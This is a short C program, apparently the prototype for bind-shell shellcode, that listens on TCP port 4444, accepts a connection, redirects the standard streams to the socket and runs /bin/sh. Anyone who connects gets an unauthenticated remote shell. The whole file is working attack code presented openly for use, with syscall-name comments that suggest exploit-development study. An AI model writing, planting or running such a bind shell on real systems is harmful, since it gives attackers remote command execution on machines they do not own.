#include <stdio.h>
#include <netinet/in.h>

// Change the correct port here
#define PORT 4444

int main(int argc, char **argv)
{	
	// sys_sockeet()	
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	
	// sys_setsocopt()
	int option = 1;
	setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(option));
	
	// sys_bind()
	struct sockaddr_in address;
	address.sin_addr.s_addr = INADDR_ANY;
	address.sin_port = htons(PORT);
	address.sin_family = AF_INET;
	bind(sock,(struct sockaddr *)&address, sizeof(address));
	
	// sys_listen()
	listen(sock,0);
	
	// sys_accept()
	int new_sock = accept(sock,NULL,NULL);
	
	// sys_dup2()
	dup2(new_sock,2);	// STDERR
	dup2(new_sock,1);	// STDOUT
	dup2(new_sock,0);	// STDIN
	
	// sys_execve()
	execve("/bin/sh",NULL,NULL);
	
	return 0;
}
